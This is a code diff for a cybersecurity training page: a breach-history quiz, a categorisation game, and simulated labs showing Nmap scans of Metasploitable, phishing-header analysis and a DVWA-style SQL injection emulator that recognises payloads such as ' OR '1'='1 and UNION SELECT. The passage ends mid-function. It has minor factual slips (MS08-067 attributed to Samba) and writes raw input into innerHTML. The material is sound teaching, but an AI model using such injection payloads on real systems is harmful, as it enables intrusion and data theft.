+  {q:"What is Heartbleed (CVE-2014-0160)?",tag:"Crypto",opts:["A virus that encrypts files","A bug in OpenSSL that allowed reading 64KB from server memory","SQL Injection in MySQL","DDoS attack on DNS servers"],ans:1,exp:"Heartbleed allowed an attacker to send a malformed Heartbeat request causing OpenSSL to return 64KB of memory — potentially containing Private Keys, passwords, and Session Tokens. 500,000 servers were exposed. The bug lived in the code for 2 years."},
+  {q:"What is the Zero Trust principle?",tag:"Network",opts:["Trust everything inside the internal network","Never trust any entity — always verify, even internally","Restrict access only to the internet","Remove firewalls and rely on encryption"],ans:1,exp:"Zero Trust = Never Trust, Always Verify. Even internal network users must authenticate and authorize for every resource access. Micro-segmentation limits lateral movement. Google BeyondCorp and NIST SP 800-207 define the architecture."},
+  {q:"SolarWinds 2020 — what type of attack?",tag:"Malware",opts:["Ransomware","DDoS","Supply Chain Attack — backdoor injected into the build pipeline","Phishing"],ans:2,exp:"APT29 injected the SUNBURST backdoor directly into SolarWinds Orion's build process. 18,000 organizations installed the compromised update. The backdoor 'slept' for 14 days to evade Sandboxes. Supply Chain Attacks are among the most sophisticated threats."},
+  {q:"What is the 3-2-1 Backup Rule?",tag:"CIA",opts:["3 drives, 2 locations, 1 encrypted","3 copies, 2 different media types, 1 offsite","3 daily backups, 2 weekly, 1 monthly","3 encryption layers, 2 keys, 1 HSM"],ans:1,exp:"3 copies of data, on 2 different media types (e.g. HDD + Cloud), with 1 copy offsite. Protects against: hardware failure, media failure, and local disasters. In the ransomware era: an offline backup the ransomware can't reach is critical."},
+  {q:"Target 2013 — what was the entry vector?",tag:"Network",opts:["Zero-Day in POS System","Breach via an HVAC vendor with network access","SQL Injection","Phishing to CTO"],ans:1,exp:"Attackers entered via a third-party HVAC vendor that had network access to Target for billing. This demonstrates Lateral Movement — enter through the weakest link, spread to sensitive assets. Target knew about the breach from a FireEye alert — and didn't act on it."},
+  {q:"What is OWASP Top 10?",tag:"Pentest",opts:["Top 10 hacking tools","A list of the 10 most common vulnerabilities in Web Applications","FBI's top 10 cybersecurity rules","Top 10 most urgent CVEs"],ans:1,exp:"OWASP (Open Web Application Security Project) publishes the most common vulnerabilities in Web Apps. 2021 Top 3: Broken Access Control, Cryptographic Failures, Injection. Every web developer must know this list."},
+  {q:"What is the difference between IDS and IPS?",tag:"Network",opts:["IDS is faster, IPS is more expensive","IDS detects and alerts, IPS actively detects and blocks","IDS is cloud-based, IPS is on-premise","No difference, they're the same thing"],ans:1,exp:"IDS = Intrusion Detection System: identifies suspicious traffic and sends alerts — Passive. IPS = Intrusion Prevention System: identifies and blocks in real-time — Inline. IPS can cause False Positives that block legitimate traffic."},
+  {q:"What is Spear Phishing?",tag:"Social Eng",opts:["Mass phishing to an entire list","Targeted phishing at a specific person with personal details","SMS-based phishing","USB-based phishing"],ans:1,exp:"Spear Phishing = a precise email targeting a specific person: 'Hi John, regarding our meeting on the 15th...' with real colleague names, LinkedIn details. 3x higher success rate than generic phishing. BEC (Business Email Compromise) = Spear Phishing targeting a CFO to approve a wire transfer."},
+  {q:"Capital One 2019 — what enabled the breach?",tag:"Cloud",opts:["Weak Password","SSRF + IAM Role with overly broad permissions","SQL Injection","Ransomware"],ans:1,exp:"SSRF (Server-Side Request Forgery) caused the server to query the AWS Metadata Service and retrieve IAM Role credentials. That Role, due to misconfiguration, had overly broad S3 permissions. Fix: IMDSv2 (prevents SSRF), Least Privilege."},
+  {q:"Which Hash Algorithm is recommended for passwords?",tag:"Crypto",opts:["MD5 with Salt","SHA-256","bcrypt or argon2id","SHA-512"],ans:2,exp:"bcrypt and argon2id are designed for passwords because they're intentionally slow and computationally expensive. MD5 = 50 billion hashes/sec on GPU. bcrypt(12) = 5,000/sec. Salt is built in. argon2id also defeats ASIC/FPGA attacks."},
+  {q:"What is MITRE ATT&CK?",tag:"SOC",opts:["A vulnerability scanning tool","A framework mapping real-world attacker tactics and techniques","A security certification","US government cybersecurity agency"],ans:1,exp:"MITRE ATT&CK = a globally-accessible knowledge base of adversary tactics, techniques, and procedures (TTPs) based on real-world observations. Divided into Tactics (what the attacker wants) and Techniques (how they do it). Used for Detection Engineering, Threat Hunting, and Red Team exercises."},
+  {q:"Heartland 2009 — what's the lesson?",tag:"Pentest",opts:["Always encrypt the DB","Known vulnerability, known patch, unclear ownership = breach","Strong firewall is enough","Don't store card data"],ans:1,exp:"The vulnerability was known, the patch was available, and 'no one felt responsible for applying it.' 130 million cards compromised. Lesson: Vulnerability Management + clear ownership + regular Penetration Testing. PCI-DSS mandates annual Pentesting for payment systems."},
+  {q:"What is the Shared Responsibility Model?",tag:"Cloud",opts:["AWS is responsible for everything","The customer is responsible for everything","AWS protects the infrastructure, customer protects their data and config","Insurance company splits responsibility"],ans:2,exp:"AWS/Azure/GCP are responsible for 'Security OF the Cloud': hardware, network, data centers. The customer is responsible for 'Security IN the Cloud': IAM, data encryption, network config, OS patching. Misconfigured S3 Bucket = customer's fault, not AWS."},
+  {q:"What is Dwell Time?",tag:"SOC",opts:["Server boot time","The time an attacker resides in a network before detection","Incident response time","DNS record TTL"],ans:1,exp:"Dwell Time = time from initial compromise to detection. Global average: 197 days (2023, M-Trends Report). During that time attackers: recon, escalate privileges, plant backdoors, exfiltrate data. Advanced SOC orgs bring this down to ~21 days."},
+  {q:"Why should the AWS Root Account not be used daily?",tag:"Cloud",opts:["Root is too weak for production","Root cannot be constrained by IAM Policy — full unrestricted access","Root is slower","Root is limited to 10 operations/day"],ans:1,exp:"Root Account = God Mode. Cannot be restricted by IAM Policies. If credentials are stolen = everything is exposed. Best Practice: create an IAM User with required permissions, enable MFA on Root, never use Root. Store Root credentials in a physical safe."},
+  {q:"What is the Cyber Kill Chain?",tag:"SOC",opts:["A server failure chain","7 stages of a Cyber Attack: Recon→Weaponize→Deliver→Exploit→Install→C2→Actions","A BreachForce method","Malware Kill Switch"],ans:1,exp:"Lockheed Martin Cyber Kill Chain: Reconnaissance → Weaponization → Delivery → Exploitation → Installation → Command & Control → Actions on Objectives. Each stage is an opportunity to stop the attack. MITRE ATT&CK details each stage into specific techniques."},
+  {q:"GDPR — what does it require in a Data Breach?",tag:"Cloud",opts:["Report within 30 days to all users","Report to the Data Protection Authority within 72 hours if there's risk to individuals","Report only if more than 1000 records were stolen","No reporting required if data is encrypted"],ans:1,exp:"GDPR Article 33: a Data Breach posing risk to individuals' rights → notify the DPA within 72 hours. Article 34: high-risk breach → also notify affected individuals directly. Fines up to €20M or 4% of annual global turnover."}
+];
+
+let qAns = 0, qScore = 0;
+
+function buildQuiz() {
+  const list = document.getElementById('qList');
+  list.innerHTML = '';
+  qAns = 0; qScore = 0;
+  document.getElementById('scoreBox').classList.remove('show');
+  updateProg();
+  QS.forEach((q, i) => {
+    const c = document.createElement('div');
+    c.className = 'q-card'; c.id = 'qc' + i;
+    c.innerHTML = `<div class="q-top"><span class="q-idx">${String(i+1).padStart(2,'0')}/20</span><span class="q-tag">${q.tag}</span></div>
+      <div class="q-text">${q.q}</div>
+      <div class="q-opts">${q.opts.map((o,j) => `<div class="q-opt" onclick="pick(${i},${j})" id="o_${i}_${j}">${o}</div>`).join('')}</div>
+      <div class="q-exp" id="exp_${i}">${q.exp}</div>`;
+    list.appendChild(c);
+  });
+}
+
+function pick(qi, oi) {
+  const q = QS[qi];
+  document.querySelectorAll(`[id^="o_${qi}_"]`).forEach(el => el.classList.add('locked'));
+  if (oi === q.ans) {
+    document.getElementById(`o_${qi}_${oi}`).classList.add('hit');
+    document.getElementById('qc' + qi).classList.add('c-ok');
+    qScore++;
+  } else {
+    document.getElementById(`o_${qi}_${oi}`).classList.add('miss');
+    document.getElementById(`o_${qi}_${q.ans}`).classList.add('hit');
+    document.getElementById('qc' + qi).classList.add('c-fail');
+  }
+  document.getElementById('exp_' + qi).classList.add('show');
+  qAns++; updateProg();
+  if (qAns === QS.length) setTimeout(showScore, 500);
+}
+
+function updateProg() {
+  document.getElementById('qp').style.width = (qAns / QS.length * 100) + '%';
+  document.getElementById('qpl').textContent = `${qAns} / ${QS.length} נענו`;
+}
+
+function showScore() {
+  const pct = Math.round(qScore / QS.length * 100);
+  document.getElementById('scoreBox').classList.add('show');
+  document.getElementById('scoreBig').innerHTML = `${qScore}<span class="frac">/20</span>`;
+  document.getElementById('scorePct').textContent = pct + '%';
+  let msg, sub;
+  if (pct >= 90) { msg = 'Security Expert! 🛡️'; sub = 'CISSP ready. Threat actors fear you.'; }
+  else if (pct >= 75) { msg = 'Senior Analyst — almost there'; sub = 'Review Crypto & Cloud Security'; }
+  else if (pct >= 55) { msg = 'Junior SOC — on the right track'; sub = 'Practice the labs and try again'; }
+  else { msg = 'Breach Detected ❌'; sub = 'Back to chapters — the enemy never sleeps'; }
+  document.getElementById('scoreMsg').textContent = msg;
+  document.getElementById('scoreSub').textContent = sub;
+  document.getElementById('scoreBox').scrollIntoView({ behavior: 'smooth' });
+}
+
+function restartQuiz() {
+  buildQuiz();
+  window.scrollTo({ top: document.getElementById('quiz').offsetTop - 80, behavior: 'smooth' });
+}
+
+buildQuiz();
+
+// ── Game ──
+const CATS = [
+  { id: 'cia',     label: 'CIA Triad',    cls: 'go-cia' },
+  { id: 'social',  label: 'Social Eng',   cls: 'go-threat' },
+  { id: 'crypto',  label: 'Crypto',       cls: 'go-crypto' },
+  { id: 'network', label: 'Network',      cls: 'go-network' },
+  { id: 'malware', label: 'Malware',      cls: 'go-malware' },
+  { id: 'pentest', label: 'Pentest',      cls: 'go-pentest' },
+  { id: 'soc',     label: 'SOC/IR',       cls: 'go-soc' },
+  { id: 'cloud',   label: 'Cloud Sec',    cls: 'go-cloud' },
+];
+
+const GQS = [
+  { desc: 'Can only authorized users access the data?', hint: 'One of the 3 foundational pillars', ans: 'cia' },
+  { desc: 'Email from CEO requesting urgent wire transfer', hint: 'Business Email Compromise', ans: 'social' },
+  { desc: 'AES-256 encrypts a file with a symmetric key', hint: 'Symmetric encryption', ans: 'crypto' },
+  { desc: 'Nmap scans open ports on the network', hint: 'Network Reconnaissance', ans: 'pentest' },
+  { desc: 'WannaCry encrypts files and demands Bitcoin', hint: 'Malicious code that encrypts', ans: 'malware' },
+  { desc: 'Firewall blocks traffic based on rules', hint: 'Network defense', ans: 'network' },
+  { desc: 'SIEM alert on login from unusual IP', hint: 'Security Operations Center', ans: 'soc' },
+  { desc: 'S3 Bucket accidentally set to public', hint: 'Cloud Misconfiguration', ans: 'cloud' },
+  { desc: 'bcrypt(12) for password storage', hint: 'Slow hashing algorithm', ans: 'crypto' },
+  { desc: '17-year-old calls employee and impersonates IT', hint: 'Voice Phishing', ans: 'social' },
+  { desc: 'Virus hides in the Kernel and conceals itself', hint: 'Rootkit', ans: 'malware' },
+  { desc: 'SQL Injection exposes all database records', hint: 'OWASP Top 10', ans: 'pentest' },
+  { desc: 'Average Dwell Time: 197 days before detection', hint: 'How long the attacker stays undetected', ans: 'soc' },
+  { desc: 'VPN encrypts traffic on a public network', hint: 'Network Security Tool', ans: 'network' },
+  { desc: 'AWS protects the data center, customer protects the data', hint: 'Shared Responsibility', ans: 'cloud' },
+  { desc: "Digital Signature verifies email wasn't modified", hint: 'Public Key Cryptography', ans: 'crypto' },
+  { desc: 'Wireshark captures credentials in HTTP Cleartext', hint: 'Network Analysis Tool', ans: 'pentest' },
+  { desc: 'Kill Chain: Recon → Weaponize → Deliver → Exploit', hint: 'Attack Lifecycle Framework', ans: 'soc' },
+  { desc: 'Zero-Day Exploit — unknown vulnerability', hint: 'Advanced Threat', ans: 'malware' },
+  { desc: 'GDPR: breach notification within 72 hours', hint: 'Data Protection Regulation', ans: 'cloud' },
+];
+
+let gScore = 0, gLives = 3, gLevel = 1, gAsked = [];
+
+function startGame() {
+  gScore = 0; gLives = 3; gLevel = 1; gAsked = [];
+  document.getElementById('gameEnd').classList.remove('show');
+  document.getElementById('gameBody').style.display = 'block';
+  updateGUI(); nextQ();
+}
+
+function updateGUI() {
+  document.getElementById('gScore').textContent = gScore;
+  document.getElementById('gLives').textContent = '❤️'.repeat(gLives) + '🖤'.repeat(3 - gLives);
+  document.getElementById('gLevel').textContent = gLevel;
+}
+
+function getCats() {
+  const count = gLevel <= 2 ? 4 : gLevel <= 4 ? 6 : 8;
+  return CATS.slice(0, count);
+}
+
+function nextQ() {
+  const rem = GQS.filter((_, i) => !gAsked.includes(i));
+  if (!rem.length || gLives <= 0) { endGame(); return; }
+  const idx = GQS.indexOf(rem[Math.floor(Math.random() * rem.length)]);
+  gAsked.push(idx);
+  const q = GQS[idx]; window._cq = q;
+  document.getElementById('gQ').textContent = q.desc;
+  document.getElementById('gH').textContent = '💭 ' + q.hint;
+  document.getElementById('gFb').textContent = '';
+  document.getElementById('gFb').className = 'game-feedback';
+  const cats = getCats();
+  document.getElementById('gOpts').innerHTML = cats.map(c =>
+    `<div class="g-opt ${c.cls}" onclick="gAns('${c.id}',this)">${c.label}<small>${
+      c.id==='cia'?'C·I·A':c.id==='social'?'Humans':c.id==='crypto'?'Encrypt':
+      c.id==='network'?'Firewall':c.id==='malware'?'Virus':c.id==='pentest'?'Attack':
+      c.id==='soc'?'Defend':'AWS/GCP'
+    }</small></div>`
+  ).join('');
+  document.getElementById('gProg').style.width = (gAsked.length / GQS.length * 100) + '%';
+  gLevel = Math.min(5, Math.floor(gScore / 4) + 1);
+  updateGUI();
+}
+
+function gAns(cat, el) {
+  const q = window._cq;
+  document.querySelectorAll('.g-opt').forEach(o => o.classList.add('locked'));
+  const fb = document.getElementById('gFb');
+  if (cat === q.ans) {
+    el.classList.add('correct');
+    gScore += gLevel;
+    fb.textContent = '✅ Correct! +' + gLevel + 'pts';
+    fb.className = 'game-feedback fb-ok';
+    updateGUI();
+    setTimeout(nextQ, 900);
+  } else {
+    el.classList.add('wrong');
+    gLives--;
+    const correct = [...document.querySelectorAll('.g-opt')].find(o =>
+      o.getAttribute('onclick') && o.getAttribute('onclick').includes("'" + q.ans + "'")
+    );
+    if (correct) correct.classList.add('correct');
+    fb.textContent = '❌ Answer: ' + (CATS.find(c => c.id === q.ans)?.label || q.ans);
+    fb.className = 'game-feedback fb-err';
+    updateGUI();
+    if (gLives <= 0) { setTimeout(endGame, 1200); return; }
+    setTimeout(nextQ, 1400);
+  }
+}
+
+function endGame() {
+  document.getElementById('gameBody').style.display = 'none';
+  document.getElementById('gameEnd').classList.add('show');
+  let emoji, title, msg;
+  if (gScore >= 55)      { emoji = '🏆'; title = 'Cyber Expert!'; msg = 'Threat Detected → Threat Neutralized. You\'re ready for the SOC.'; }
+  else if (gScore >= 32) { emoji = '🛡️'; title = 'Security Analyst'; msg = 'Very good. Practice more Cloud Security.'; }
+  else if (gScore >= 18) { emoji = '🔍'; title = 'Junior Analyst'; msg = 'Solid foundation. Review the chapters and try again.'; }
+  else                   { emoji = '📖'; title = 'Breach Detected'; msg = 'Attacker 1 — Defender 0. Back to the chapters.'; }
+  document.getElementById('geEmoji').textContent = emoji;
+  document.getElementById('geTitle').textContent = title;
+  document.getElementById('geScore').textContent = 'score: ' + gScore + ' | lives: ' + gLives;
+  document.getElementById('geMsg').textContent = msg;
+}
+
+startGame();
+
+
+// ══════════ CYBERSECURITY EMULATORS ══════════
+
+function cyC(id) { const el=document.getElementById(id); if(el) el.innerHTML='<span class="em">Cleared...</span>'; }
+function cyP(id, html, append=true) {
+  const el=document.getElementById(id); if(!el) return;
+  if(!append) el.innerHTML='';
+  const d=document.createElement('div'); d.innerHTML=html; el.appendChild(d);
+  if(append && el.firstChild && el.firstChild.classList && el.firstChild.classList.contains('em')) el.firstChild.remove();
+  el.scrollTop=el.scrollHeight;
+}
+function cyDelay(ms) { return new Promise(r=>setTimeout(r,ms)); }
+
+// ── LAB 1: Nmap ──
+async function cyLab1() {
+  const cmd = document.getElementById('cy1cmd').value;
+  const btn = document.getElementById('cy1btn');
+  btn.textContent='⏳ Scanning...'; btn.classList.add('running'); btn.disabled=true;
+  cyC('cy1out');
+
+  const cmds = {
+    sn: {
+      cmd: 'nmap -sn 192.168.1.0/24',
+      delay: 1800,
+      out: [
+        'Starting Nmap 7.94 ( https://nmap.org )',
+        '<span class="dim">Nmap scan report for 192.168.1.1 (Router)</span>',
+        '<span class="ok">Host is up</span> (0.0023s latency). MAC Address: AA:BB:CC:11:22:33 (Cisco)',
+        '<span class="dim">Nmap scan report for 192.168.1.100 (Windows PC)</span>',
+        '<span class="ok">Host is up</span> (0.0041s latency). MAC Address: 08:00:27:AB:CD:EF (VirtualBox)',
+        '<span class="warn">Nmap scan report for 192.168.1.105 (Metasploitable)</span>',
+        '<span class="ok">Host is up</span> (0.00062s latency). MAC Address: 08:00:27:12:34:56 (VirtualBox)',
+        '<span class="dim">Nmap done: 256 IP addresses (3 hosts up) scanned in 3.21 seconds</span>',
+      ]
+    },
+    sS: {
+      cmd: 'nmap -sS -p 1-1000 192.168.1.105',
+      delay: 2200,
+      out: [
+        'Starting Nmap 7.94 — SYN Stealth Scan',
+        '<span class="dim">Nmap scan report for 192.168.1.105</span>',
+        '<span class="ok">Host is up</span> (0.00045s latency)',
+        '',
+        '<span class="key">PORT     STATE  SERVICE</span>',
+        '<span class="ok">21/tcp   open   ftp</span>',
+        '<span class="ok">22/tcp   open   ssh</span>',
+        '<span class="ok">23/tcp   open   telnet</span>',
+        '<span class="warn">25/tcp   open   smtp</span>',
+        '<span class="ok">80/tcp   open   http</span>',
+        '<span class="warn">139/tcp  open   netbios-ssn</span>',
+        '<span class="warn">445/tcp  open   microsoft-ds</span>',
+        '<span class="ok">3306/tcp open   mysql</span>',
+        '<span class="warn">5432/tcp open   postgresql</span>',
+        '<span class="dim">Not shown: 991 closed tcp ports (reset)</span>',
+        '<span class="dim">Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds</span>',
+      ]
+    },
+    sV: {
+      cmd: 'nmap -sV -sC 192.168.1.105',
+      delay: 3500,
+      out: [
+        'Starting Nmap 7.94 — Service/Version Detection + Default Scripts',
+        '',
+        '<span class="key">PORT     STATE SERVICE     VERSION</span>',
+        '<span class="ok">21/tcp   open  ftp</span>         <span class="warn">vsftpd 2.3.4</span>',
+        '|_ftp-anon: <span class="warn">Anonymous FTP login allowed</span>',
+        '<span class="ok">22/tcp   open  ssh</span>         <span class="warn">OpenSSH 4.7p1</span> Debian 8ubuntu1 (protocol 2.0)',
+        '<span class="ok">23/tcp   open  telnet</span>      <span class="err">Linux telnetd ← PLAINTEXT CREDENTIALS!</span>',
+        '<span class="ok">80/tcp   open  http</span>        Apache httpd 2.2.8 ((Ubuntu) DAV/2)',
+        '|_http-title: <span class="val">Metasploitable2 - Linux</span>',
+        '<span class="warn">445/tcp  open  netbios-ssn</span> <span class="err">Samba smbd 3.X (CVE-2007-2447)</span>',
+        '<span class="ok">3306/tcp open  mysql</span>       <span class="warn">MySQL 5.0.51a</span>',
+        '| mysql-empty-password: <span class="err">root account has no password!</span>',
+        '',
+        '<span class="dim">Service detection performed. Nmap done in 12.34 seconds</span>',
+        '',
+        '<span class="warn">⚠ Vulnerabilities found: vsftpd 2.3.4 Backdoor, Samba ms08-067, MySQL no password</span>',
+      ]
+    },
+    O: {
+      cmd: 'nmap -O 192.168.1.105',
+      delay: 2000,
+      out: [
+        'Starting Nmap 7.94 — OS Detection',
+        '<span class="ok">Host is up</span> (0.00044s latency)',
+        '',
+        '<span class="key">OS Detection Results:</span>',
+        'Running: <span class="val">Linux 2.6.X</span>',
+        'OS CPE: cpe:/o:linux:linux_kernel:2.6',
+        'OS details: <span class="val">Linux 2.6.9 - 2.6.33</span>',
+        'Uptime guess: 0.024 days (since today)',
+        'Network Distance: 1 hop',
+        '<span class="dim">TCP Sequence Prediction: Difficulty=205 (Good luck!)</span>',
+        '<span class="dim">IP ID Sequence Generation: All zeros</span>',
+        '',
+        '<span class="ok">✓ OS Identified: Linux 2.6.x (Ubuntu 8.04 Metasploitable)</span>',
+      ]
+    },
+    full: {
+      cmd: 'nmap -sV -sC -p- 192.168.1.105',
+      delay: 4500,
+      out: [
+        '<span class="dim">Starting Nmap 7.94 — Full port scan (65535 ports)</span>',
+        '<span class="dim">⏳ This may take a few minutes...</span>',
+        '',
+        '<span class="key">PORT      STATE SERVICE      VERSION</span>',
+        '<span class="ok">21/tcp    open  ftp</span>          vsftpd 2.3.4 <span class="err">← BACKDOOR CVE-2011-2523</span>',
+        '<span class="ok">22/tcp    open  ssh</span>          OpenSSH 4.7p1',
+        '<span class="ok">23/tcp    open  telnet</span>       Linux telnetd',
+        '<span class="ok">80/tcp    open  http</span>         Apache 2.2.8',
+        '<span class="ok">139/tcp   open  netbios-ssn</span>  Samba 3.X <span class="err">← CVE-2007-2447</span>',
+        '<span class="ok">3306/tcp  open  mysql</span>        MySQL 5.0.51a <span class="err">← no root password!</span>',
+        '<span class="ok">5900/tcp  open  vnc</span>          VNC (protocol 3.3) <span class="warn">← password: password</span>',
+        '<span class="ok">8180/tcp  open  http</span>         Apache Tomcat/Coyote 1.1 <span class="warn">← default creds</span>',
+        '',
+        '<span class="err">🎯 Attack surface: HIGH — Multiple critical vulnerabilities found</span>',
+        '<span class="dim">Nmap done: 1 IP address (1 host up) scanned in 62.18 seconds</span>',
+      ]
+    }
+  };
+
+  const scan = cmds[cmd];
+  cyP('cy1out', `<span class="dim">$ </span><span class="key">${scan.cmd}</span>`);
+  await cyDelay(scan.delay);
+  for (const line of scan.out) {
+    cyP('cy1out', line || '&nbsp;');
+    await cyDelay(60);
+  }
+  btn.textContent='▶ Run Scan'; btn.classList.remove('running'); btn.disabled=false;
+}
+
+// ── LAB 2: Phishing ──
+const CY2_SAMPLES = {
+  paypal: {
+    headers: `From: "PayPal Security" <security@paypa1.com>
+Reply-To: attacker99@gmail.com
+Return-Path: bounce@spamserver.ru
+Subject: =?UTF-8?B?6K+V6K+V6K+V?= Your account has been suspended — action required within 24 hours!
+Date: ${new Date().toUTCString()}
+Received-SPF: fail (domain paypa1.com does not designate server)
+DKIM-Signature: MISSING
+DMARC: fail (p=quarantine)`,
+    flags: [
+      {type:'err', msg:'Domain: paypa1.com (not paypal.com!) — Typosquatting'},
+      {type:'err', msg:'Reply-To different from From — attacker99@gmail.com'},
+      {type:'err', msg:'Return-Path: server in Russia (spamserver.ru)'},
+      {type:'err', msg:'Received-SPF: FAIL — domain does not authorize sending from this IP'},
+      {type:'err', msg:'DKIM: completely missing — email is unsigned'},
+      {type:'err', msg:'DMARC: fail — domain policy declares quarantine'},
+      {type:'warn', msg:'Artificial urgency: "24 hours" — Social Engineering'},
+    ],
+    verdict: 'PHISHING', score: 0
+  },
+  ceo: {
+    headers: `From: "David Cohen - CEO" <d.cohen@company-il.com>
+Reply-To: david.cohen.ceo@gmail.com
+Subject: URGENT - Wire transfer required today
+Date: ${new Date().toUTCString()}
+Received-SPF: pass
+DKIM-Signature: v=1; d=company-il.com; s=mail
+DMARC: pass`,
+    flags: [
+      {type:'ok',  msg:'SPF: pass — domain authorized to send'},
+      {type:'ok',  msg:'DKIM: signed on company-il.com'},
+      {type:'err', msg:'Reply-To: gmail! — real CEO replies from company domain'},
+      {type:'warn', msg:'Subject: "Urgent", "Today" — pressure for fast action'},
+      {type:'warn', msg:'BEC Pattern: impersonating CEO to request a wire transfer'},
+      {type:'warn', msg:'No recipient name, amount, or purpose mentioned — Generic Request'},
+    ],
+    verdict: 'BEC PHISHING', score: 15
+  },
+  it: {
+    headers: `From: "IT Support" <helpdesk@company.co.il>
+Reply-To: helpdesk@company.co.il
+Subject: Urgent password reset required — HR system
+Date: ${new Date().toUTCString()}
+Received-SPF: pass
+DKIM-Signature: v=1; d=company.co.il
+DMARC: pass (p=reject)`,
+    flags: [
+      {type:'ok',  msg:'SPF / DKIM / DMARC: all pass'},
+      {type:'warn', msg:'Real IT never asks for a password via email — Never!'},
+      {type:'warn', msg:'Reset link: http://company-reset.xyz (not the real domain)'},
+      {type:'err', msg:'URL Mismatch: text shows company.co.il but link goes to xyz'},
+      {type:'warn', msg:'Urgency: "Urgent" — creates pressure before verification'},
+    ],
+    verdict: 'SUSPICIOUS', score: 30
+  },
+  legit: {
+    headers: `From: "Bank Hapoalim" <no-reply@bankhapoalim.co.il>
+Reply-To: no-reply@bankhapoalim.co.il
+Subject: Important account update
+Date: ${new Date().toUTCString()}
+Received-SPF: pass (bankhapoalim.co.il authorized)
+DKIM-Signature: v=1; a=rsa-sha256; d=bankhapoalim.co.il; s=mail2024
+DMARC: pass (p=reject; sp=reject)
+Message-ID: <20240115-142201.abc123@bankhapoalim.co.il>`,
+    flags: [
+      {type:'ok', msg:'SPF: PASS — IP authorized by domain'},
+      {type:'ok', msg:'DKIM: PASS — email signed with RSA-SHA256'},
+      {type:'ok', msg:'DMARC: PASS + p=reject — strict policy'},
+      {type:'ok', msg:'Reply-To matches From — not trying to redirect replies'},
+      {type:'ok', msg:'Message-ID: legitimate format with timestamp'},
+      {type:'ok', msg:'No artificial urgency, no credential requests'},
+    ],
+    verdict: 'LEGITIMATE', score: 100
+  }
+};
+
+function cy2Preview() {
+  const s = CY2_SAMPLES[document.getElementById('cy2sample').value];
+  document.getElementById('cy2hdr').value = s.headers;
+}
+
+async function cyLab2() {
+  cyC('cy2out');
+  const key = document.getElementById('cy2sample').value;
+  const sample = CY2_SAMPLES[key];
+  const customHdr = document.getElementById('cy2hdr').value;
+
+  cyP('cy2out', '<span class="key">── Email Header Analysis ──</span>');
+  await cyDelay(300);
+
+  // Parse and show headers
+  const lines = customHdr.split('\n').filter(l=>l.trim());
+  for (const line of lines.slice(0,8)) {
+    const [key2, ...rest] = line.split(':');
+    if (rest.length) {
+      cyP('cy2out', `<span class="hi">${key2}:</span><span class="dim">${rest.join(':')}</span>`);
+    }
+    await cyDelay(80);
+  }
+
+  cyP('cy2out', '\n<span class="key">── Red Flag Analysis ──</span>');
+  await cyDelay(400);
+
+  const flags = sample.flags;
+  let red=0, warn=0, ok=0;
+  for (const f of flags) {
+    await cyDelay(200);
+    const icon = f.type==='err'?'❌':f.type==='warn'?'⚠️':'✅';
+    cyP('cy2out', `${icon} <span class="${f.type==='err'?'err':f.type==='warn'?'warn':'ok'}">${f.msg}</span>`);
+    if(f.type==='err') red++;
+    else if(f.type==='warn') warn++;
+    else ok++;
+  }
+
+  await cyDelay(400);
+  const verdict = sample.verdict;
+  const vColor = verdict==='LEGITIMATE'?'ok':verdict==='SUSPICIOUS'?'warn':'err';
+  cyP('cy2out', `\n<span class="key">── Verdict ──</span>`);
+  cyP('cy2out', `<span class="${vColor}">🔍 ${verdict}</span>  Red Flags: ${red}  Warnings: ${warn}  OK: ${ok}`);
+
+  if (verdict !== 'LEGITIMATE') {
+    cyP('cy2out', `<span class="dim">Recommended action: do not click links. Report to security@company. Delete.</span>`);
+  }
+}
+
+// ── LAB 3: SQL Injection ──
+const CY3_DB = [
+  {id:1, user:'admin', password:'5f4dcc3b5aa765d61d8327deb882cf99', first:'Admin', last:'Admin'},
+  {id:2, user:'gordonb', password:'e99a18c428cb38d5f260853678922e03', first:'Gordon', last:'Brown'},
+  {id:3, user:'1337', password:'8d3533d75ae2c3966d7e0d4fcc69216b', first:'Hack', last:'Me'},
+  {id:4, user:'pablo', password:'0d107d09f5bbe40cade3de5c71e9e9b7', first:'Pablo', last:'Picasso'},
+  {id:5, user:'smithy', password:'5f4dcc3b5aa765d61d8327deb882cf99', first:'Bob', last:'Smith'},
+];
+
+function cy3q(val) { document.getElementById('cy3in').value = val; }
+
+function cyLab3() {
+  const input = document.getElementById('cy3in').value;
+  const level = document.getElementById('cy3lvl').value;
+  cyC('cy3out');
+
+  cyP('cy3out', `<span class="dim">$ </span><span class="key">POST /dvwa/vulnerabilities/sqli/</span>`);
+  cyP('cy3out', `<span class="dim">Input: "${input}"</span>`);
+
+  if (level === 'high') {
+    // Prepared statements
+    cyP('cy3out', '\n<span class="dim">// Server code (High security):</span>');
+    cyP('cy3out', '<span class="key">$stmt = $db->prepare("SELECT * FROM users WHERE id=?");</span>');
+    cyP('cy3out', '<span class="key">$stmt->execute([$id]);</span>');
+    cyP('cy3out', '\n<span class="ok">✅ Prepared Statement — Input treated as DATA, not code</span>');
+    cyP('cy3out', '<span class="dim">The ? placeholder is sanitized — SQL injection not possible</span>');
+
+    const clean = parseInt(input);
+    if (!isNaN(clean) && clean >= 1 && clean <= 5) {
+      const row = CY3_DB.find(r=>r.id===clean);
+      if(row) cyP('cy3out', `\n<span class="ok">Result: ID=${row.id}, First Name: ${row.first}, Surname: ${row.last}</span>`);
+    } else {
+      cyP('cy3out', '\n<span class="ok">Result: 0 rows (Payload sanitized, no injection)</span>');
+    }
+    return;
+  }
+
+  // Vulnerable (Low level)
+  const query = `SELECT first_name, last_name FROM users WHERE user_id='${input}'`;
+  cyP('cy3out', `\n<span class="dim">// Vulnerable query:</span>`);
+  cyP('cy3out', `<span class="err">SELECT first_name, last_name FROM users WHERE user_id='${input}'</span>`);
+
+  if (input.includes("' OR '1'='1") || input.includes("1'='1")) {
+    cyP('cy3out', '\n<span class="err">⚠ Tautology! OR 1=1 is always TRUE → returns ALL rows</span>');
+    for (const r of CY3_DB) {
+      cyP('cy3out', `<span class="ok">ID: ${r.id}  First: ${r.first}  Last: ${r.last}</span>`);
+    }
+  } else if (input.includes('ORDER BY')) {
+    const n = parseInt(input.match(/ORDER BY (\d+)/)?.[1]);
+    if (n > 2) {
+      cyP('cy3out', '\n<span class="err">MySQL error: Unknown column \'3\' in \'order clause\'</span>');
+      cyP('cy3out', '<span class="ok">💡 The table has 2 columns! ORDER BY 1 and 2 worked.</span>');
+    } else {
+      cyP('cy3out', `\n<span class="ok">ORDER BY ${n} — no error. Column ${n} exists.</span>`);
+    }
+  } else if (input.includes('UNION SELECT')) {
